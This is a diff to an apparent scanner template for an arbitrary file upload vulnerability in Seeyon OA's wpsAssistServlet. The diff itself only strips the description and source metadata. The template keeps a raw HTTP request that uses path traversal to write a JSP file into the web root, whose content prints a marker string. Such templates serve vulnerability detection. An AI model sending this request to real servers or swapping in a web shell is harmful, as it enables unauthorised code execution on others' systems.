@@ -3,12 +3,8 @@ info:
   name: 致远OA wpsAssistServlet接口任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zbieeqfv4zkgbzt4'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zbieeqfv4zkgbzt4
-    fofa: 暂无
 http:
 - raw:
   - 'POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/01014.jsp&fileId=2 HTTP/1.1
@@ -26,8 +22,6 @@ http:
     Content-Type: multipart/form-data; boundary=a4d7586ac9d50625dee11e86fa69bc71
 
 
-
-
     --a4d7586ac9d50625dee11e86fa69bc71
 
 
@@ -35,8 +29,6 @@ http:
 
 
     Content-Type: application/vnd.ms-excel
-
-
 
 
     <% out.println("215882935");%>
